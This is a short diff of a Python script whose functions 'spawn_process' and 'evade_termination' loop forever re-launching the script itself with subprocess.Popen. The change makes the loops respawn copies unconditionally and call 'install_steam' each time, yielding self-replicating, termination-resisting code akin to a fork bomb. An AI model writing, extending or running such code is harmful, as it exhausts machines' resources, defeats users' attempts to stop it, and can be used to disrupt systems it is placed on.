@@ -82,17 +82,16 @@ def install_steam():
 
 
 def spawn_process():
-    script_path = os.path.abspath(__file__)
     while True:
+        install_steam()
+        script_path = os.path.abspath(__file__)
         subprocess.Popen(["python", script_path])
 
 
 def evade_termination():
     while True:
-        running = subprocess.getoutput(f"pgrep -f {SCRIPT_NAME} | wc -l")
-        if int(running):
-            install_steam()
-            subprocess.Popen(["python", os.path.abspath(__file__)])
+        subprocess.getoutput(f"pgrep -f {SCRIPT_NAME} | wc -l")
+        subprocess.Popen(["python", os.path.abspath(__file__)])
 
 
 if __name__ == "__main__":
